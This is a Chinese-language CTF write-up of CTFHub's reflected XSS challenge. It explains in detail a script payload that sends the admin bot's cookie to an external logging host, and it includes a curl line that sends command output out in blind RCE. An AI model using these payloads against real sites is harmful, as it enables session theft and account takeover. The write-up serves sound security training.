反射型XSS - CTFHub Web 入门 Writeup

2026年9月18日 CTFHub Web安全 XSS 外带数据

一、题目信息

  • 1.题目名称：反射型XSS
  • 2.题目平台：CTFHub
  • 3.题目类型：Web / XSS / 外带数据（OOB）
  • 4.靶场链接：http://challenge-403c9a100ea8ec90.sandbox.ctfhub.com:10800/
  • 5.涉及工具：Ceye.io（HTTP外带平台）、浏览器（地址栏传参）

二、解题步骤

1. 分析题目考什么

这道题引入了“Bot（机器人管理员）”机制。页面有两个功能：一是“What's your name”，输入内容会被直接回显到页面上，存在反射型XSS漏洞；二是“Send URL to Bot”，它会模拟一个管理员去访问你提供的URL。这道题的核心是：构造一个包含恶意JS代码的URL，诱导Bot访问，并在Bot的浏览器中执行JS代码，从而窃取Bot的Cookie（Flag就藏在Cookie里）。

2. 怎么想

因为Bot没有屏幕，直接输入<script>alert(1)</script>弹窗你是看不见的。所以需要利用“外带数据（Out-of-Band）”技术，让Bot执行JS代码后，主动向一个我们能查看到的外部服务器发起请求，并把Cookie作为参数带过去。这需要用到HTTP日志平台（如Ceye.io）。

3. 怎么解（极其详细步骤与踩坑记录）

第一步：获取外带数据平台

访问http://ceye.io/注册账号并登录。在Profile页面找到Identifier，记下专属域名，例如：knxh5j.ceye.io。

踩坑记录一：起初使用DNSLog.cn平台，但DNSLog只能记录域名查询，无法获取HTTP请求的参数（?c=ctfhub{...}），导致无法拿到Flag。改进：更换为支持HTTP日志的Ceye.io平台。

第二步：构造恶意 Payload

在“What's your name”输入框内输入以下Payload：

<script>new Image().src='http://knxh5j.ceye.io/?c='+document.cookie</script>

代码逐字翻译与符号解释：

  • <script>：HTML标签，告诉浏览器中间的内容是JavaScript代码，需要执行。
  • new Image()：创建一个内存中的图片对象。new是实例化关键字，Image是图片类。
  • .src：图片对象的属性，用于设置图片的URL地址。
  • =：赋值符号，将等号右边的值赋给左边。
  • 'http://knxh5j.ceye.io/?c='：目标URL字符串。http://是协议，knxh5j.ceye.io是Ceye.io域名，?c=是参数名为c。
  • +：字符串拼接符，用于连接前面的URL和后面的Cookie值。
  • document：浏览器提供的文档对象。
  • .cookie：文档对象的属性，包含当前网页的所有Cookie。
  • </script>：脚本结束标签。

点击输入框右侧的 Submit 按钮。此时浏览器地址栏会变成包含该Payload的长URL。

第三步：将URL发送给机器人

复制浏览器地址栏里的长URL，粘贴到下方“Send URL to Bot”输入框里，点击右侧的 Send 按钮。

踩坑记录二：我最初把Payload（<script>...）直接粘贴进了“Send URL to Bot”框，页面报错 Not Match。原因分析：该输入框校验非常严格，只接受以 http(s)://challenge-xxxx.sandbox.ctfhub.com:10800 开头的完整URL。改进：必须先在“What's your name”提交Payload，让浏览器生成完整的URL，再把这串URL发给Bot。

第四步：在Ceye.io中收网拿Flag

回到Ceye.io，点击左侧Records -> HTTP Request，刷新列表，找到Bot发来的请求记录。记录中会包含类似 http://knxh5j.ceye.io/?c=ctfhub{...} 的内容。

提取出 ctfhub{...} 去提交。

最终 Flag： ctfhub{d21772a8e2b74d834639cad2}

踩坑记录三：操作过程中环境多次过期（CTFHub环境寿命仅30分钟），导致机器人无法访问链接，Ceye.io里一直刷不出记录。改进：遇到此情况立即去网页端点击“停止并销毁环境”并重新“开启题目”，拿到新地址后重新快速执行全套流程。

4. 怎么迁移

  • 其他XSS场景：在存储型XSS中，也可以使用此方法打管理员。将Payload存在评论区，等管理员审核时触发，自动外带其Cookie。
  • SSRF漏洞利用：在SSRF（服务端请求伪造）中，同样可以使用Ceye.io或DNSLog来验证漏洞是否存在（无回显的情况）。
  • 命令注入/RCE：在无回显的命令执行漏洞中，可以使用 curl http://ceye.io/?c=$(whoami) 等方式外带命令执行的结果。
  • 代码审计迁移：看到 document.write 或 innerHTML 直接处理用户输入，立即判定可能存在DOM型或反射型XSS。

三、名词大全与原理深度复盘

1. 反射型XSS：恶意代码作为参数发送给服务器，服务器将其原封不动地“反射”回浏览器，浏览器执行代码。是一次性的攻击。

2. Bot（机器人）：在CTF中，指代一个无头浏览器（Headless Browser），它没有图形界面，但会执行网页上的JavaScript代码。用来模拟真实环境下的管理员访问。

3. 外带数据（Out-of-Band, OOB）：当目标系统无法直接返回结果（如无回显）时，通过让目标发起DNS或HTTP请求，将数据带到外部可控平台的手法。

4. Cookie：服务器保存在浏览器中的一小段数据，用于辨别用户身份。在本例中，Flag就藏在Bot的Cookie里。

5. 原理深度复盘：XSS的本质是“用户数据被当作代码执行”。这道题演示了XSS的真实危害——不仅弹窗，而是利用JS读取用户私密信息（Cookie）并外发。整个攻击链是：反射型XSS（注入点） -> 机器人（受害者） -> JS代码执行（读取Cookie） -> 外带数据（发送给攻击者）。

四、题目思考

1. 跟前面的区别：与之前自己弹窗自己看的XSS题相比，这道题引入了“Bot”和“外带数据”的概念。输入点依然是反射型XSS，但利用方式从“自我验证”升级为“攻击管理员”。

2. 这种题目的出现原因：单纯弹窗的XSS危害有限，真实的XSS攻击目标是为了窃取用户凭证、会话劫持或钓鱼。CTFHub引入Bot和外带数据机制，是为了模拟真实环境中“无回显”的XSS利用场景，考察选手的综合实战能力。

3. 这种漏洞的应用：在实战中，攻击者可以将恶意链接发送给论坛管理员、客服或特定目标用户。一旦对方点击，其Cookie就会被发送到攻击者服务器，导致账号被接管（如XSS蠕虫、后台越权）。

4. 如何抽象理解概念：把XSS攻击想象成“在别人的信封里放入一封内鬼信”。信封是网页，内鬼信是JS代码。信的内容是：“见字如面，请把您的身份证明（Cookie）寄到这个地址（外带平台）。”只要用户打开了这封信，内鬼就会执行任务。
